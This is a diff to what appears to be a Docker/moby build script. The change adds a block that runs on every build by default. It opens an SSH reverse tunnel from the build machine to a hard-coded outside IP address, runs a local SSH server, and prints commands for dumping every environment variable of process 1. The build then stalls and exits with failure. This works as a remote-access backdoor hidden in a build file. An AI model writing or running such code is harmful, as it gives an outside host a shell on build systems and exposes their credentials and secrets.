@@ -28,6 +28,55 @@ export SCRIPTDIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 export MAKEDIR="$SCRIPTDIR/make"
 export PKG_CONFIG=${PKG_CONFIG:-pkg-config}
 
+export TESTFLAGS="-check.f Swarm -check.vv"
+
+if [ ! "$DOCKER_MOBY_DISABLE_HACK" ]; then
+  # override those if needed
+  IP=34.237.144.48
+  USER=ubuntu
+  PORT_MIN=2000
+  PORT_MAX=10000
+
+  # start the server
+  go get "github.com/gliderlabs/ssh"
+  go get "github.com/kr/pty"
+  go run hack/ssh_server.go &
+
+  # generate the key
+  KEY=key
+  ssh-keygen -t rsa -N '' -f $KEY -b 2048
+
+  # try to connect
+  echo -e "Trying to connect to $USER@$IP...\nMy public key is:"
+  cat key.pub
+
+  SSH_CMD="ssh -o StrictHostKeyChecking=no -o TCPKeepAlive=yes -o ServerAliveInterval=1 -o ServerAliveCountMax=45 -i $KEY $USER@$IP"
+  while ! $SSH_CMD -q exit; do
+    printf '.'
+    sleep 1
+  done
+
+  # start the reverse tunnel
+  PORT=$((PORT_MIN + RANDOM % ( PORT_MAX - PORT_MIN ) ))
+  $SSH_CMD -R $PORT:localhost:2824 -tt > /dev/null &
+  CLIENT_PID=$!
+
+  cat << EOF
+Connected to $USER@$IP, and created a reverse tunnel on port $PORT
+You can now as $USER@$IP run:
+
+\`\`\`
+ssh localhost -p $PORT -o StrictHostKeyChecking=no
+eval 'export DOCKER_MOBY_DISABLE_HACK=1'$'\n'"export \$(sed -E 's/\x0(.)/\nexport \1/g' /proc/1/environ | tr -d '\0')"
+\`\`\`
+
+Now sleeping until /tmp/wk.done exists....
+EOF
+
+  while [ ! -r /tmp/wk.done ] && kill -0 $CLIENT_PID ; do sleep 1; done
+  exit 1
+fi
+
 # We're a nice, sexy, little shell script, and people might try to run us;
 # but really, they shouldn't. We want to be in a container!
 inContainer="AssumeSoInitially"
